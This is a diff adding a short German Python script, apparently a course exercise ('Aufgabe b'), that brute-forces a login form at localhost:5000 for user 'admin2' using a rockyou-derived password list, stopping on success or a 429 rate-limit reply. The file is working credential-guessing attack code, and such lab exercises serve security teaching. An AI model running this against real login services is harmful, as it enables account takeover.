@@ -1,0 +1,50 @@
+# Aufgabe b: Brute Force mit Word-List
+
+import requests
+import time
+
+
+# Sendet einen Login-Versuch an den Server
+def try_password(password):
+    url = "http://localhost:5000"
+
+    data = {
+        "username": "admin2",
+        "password": password
+    }
+
+    # Bei einem Verbindungsfehler wird dasselbe Passwort erneut versucht
+    while True:
+        try:
+            response = requests.post(url, data=data, timeout=5)
+            return response.status_code
+
+        except requests.exceptions.RequestException:
+            print("Server nicht erreichbar - warte 1 Sekunde...")
+            time.sleep(1)
+
+
+# Liest die Passwortliste und probiert jedes Passwort aus
+def wordlist_attack():
+
+    with open("rockyou_kurz.txt", "r", encoding="latin-1") as file:
+
+        for line in file:
+
+            # Entfernt den Zeilenumbruch am Ende des Passworts
+            password = line.rstrip("\r\n")
+
+            print(f"Teste Passwort: {password}")
+
+            status_code = try_password(password)
+
+            if status_code == 200:
+                print(f"Passwort gefunden: {password}")
+                break
+
+            elif status_code == 429:
+                print("Server hat uns gesperrt:")
+                break
+
+
+wordlist_attack()
